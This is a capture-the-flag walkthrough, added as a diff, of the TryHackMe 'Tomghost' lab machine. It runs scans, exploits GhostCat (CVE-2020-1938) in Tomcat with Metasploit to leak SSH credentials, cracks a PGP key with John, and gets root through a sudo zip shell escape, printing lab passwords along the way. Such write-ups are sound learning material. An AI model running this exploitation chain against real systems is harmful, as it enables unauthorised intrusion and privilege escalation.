@@ -1,0 +1,98 @@
+Tomghost - TryHackMe Writeup
+
+Target Information
+- Machine IP: 10.48.133.150
+- Vhost Name: tomghost.thm
+
+Reconnaissance
+
+Nmap Scan:
+$ nmap -sV -O 10.48.133.150
+
+Open Ports:
+- 22/tcp  - SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.8)
+- 53/tcp  - tcpwrapped
+- 8009/tcp - ajp13 (filtered)
+- 8080/tcp - http-proxy (filtered)
+
+OS Detection suggested Linux 3.x-5.x.
+
+Enumeration
+
+Web Service (Port 8080):
+Default Apache Tomcat 9.0.30 page found.
+
+Gobuster Scan:
+$ gobuster dir -u http://xx.xx.xx.xx:8080 -w /usr/share/wordlists/dirb/common.txt
+
+Found:
+- /docs (Status: 302)
+- /examples (Status: 302)
+- /manager (Status: 302)
+
+No useful directories found.
+
+Exploitation
+
+GhostCat Vulnerability (CVE-2020-1938):
+Used Metasploit module:
+$ msfconsole
+> use auxiliary/admin/http/tomcat_ghostcat
+> set rhosts 10.48.133.150
+> run
+
+Output contained:
+<display-name>Welcome to Tomcat</display-name>
+<description>
+   Welcome to GhostCat
+   skyfuck:8730281lkjlkjdqlksalks
+</description>
+
+SSH Access:
+Used credentials to SSH into machine:
+$ ssh skyfuck@10.48.133.150
+
+User Flag & Further Enumeration
+
+Found user.txt in skyfuck's home directory.
+
+Found encrypted files:
+- credential.pgp
+- tryhackme.asc
+
+Cracking the PGP Key:
+1. Convert to John format:
+   $ gpg2john tryhackme.asc > tomghost.hash
+
+2. Crack with John:
+   $ john --wordlist=/usr/share/wordlists/rockyou.txt tomghost.hash
+
+3. Found password: alexandru
+
+4. Import private key:
+   $ gpg --import tryhackme.asc
+   (Enter password: alexandru)
+
+5. Decrypt credential.pgp:
+   $ gpg --decrypt credential.pgp
+
+   Output contained credentials:
+   merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+Privilege Escalation
+
+Logged in as merlin:
+$ su merlin
+Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+Checked sudo permissions:
+$ sudo -l
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+
+Used GTFOBins technique:
+$ sudo zip /tmp/test.zip /etc/hosts -T -TT '/bin/bash #'
+
+Root shell obtained, retrieved root.txt.
+
+Finish
